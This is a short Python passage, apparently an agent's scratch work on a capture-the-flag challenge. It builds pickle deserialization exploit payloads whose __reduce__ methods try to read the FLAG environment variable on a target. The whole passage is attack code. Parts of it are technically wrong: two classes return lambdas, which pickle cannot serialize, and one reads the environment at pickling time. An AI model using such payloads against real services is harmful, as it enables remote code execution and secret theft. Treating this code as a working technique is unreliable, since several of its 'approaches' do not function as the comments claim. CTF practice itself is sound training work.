# Actually, let me try a simpler approach - execute a function that returns FLAG in list
class Exploit4:
    def __reduce__(self):
        # Creates a list with FLAG as an element using setattr trick
        return (
            lambda: [__import__('os').environ.get('FLAG', 'NOT_FOUND')],
            ()
        )

obj4 = Exploit4()
payload4 = base64.b64encode(pickle.dumps(obj4, protocol=4)).decode()
print(f"PAYLOAD (lambda version): {payload4}")
print()

# Final approach: use getattr with builtins
class Exploit5:
    def __reduce__(self):
        import os
        import builtins
        # Return FLAG wrapped in a list
        return (
            builtins.list,
            ([os.environ.get('FLAG', 'NOT_FOUND')],)
        )

obj5 = Exploit5()
payload5 = base64.b64encode(pickle.dumps(obj5, protocol=4)).decode()
print(f"PAYLOAD (list with FLAG): {payload5}")
print()

# Best approach: use tuple unpacking with multiple elements
class Exploit6:
    def __reduce__(self):
        return (
            lambda flag: [flag],
            (__import__('os').environ.get('FLAG', 'NOT_FOUND'),)
        )

obj6 = Exploit6()
payload6 = base64.b64encode(pickle.dumps(obj6, protocol=4)).decode()
print(f"PAYLOAD (lambda with args): {payload6}")
print()

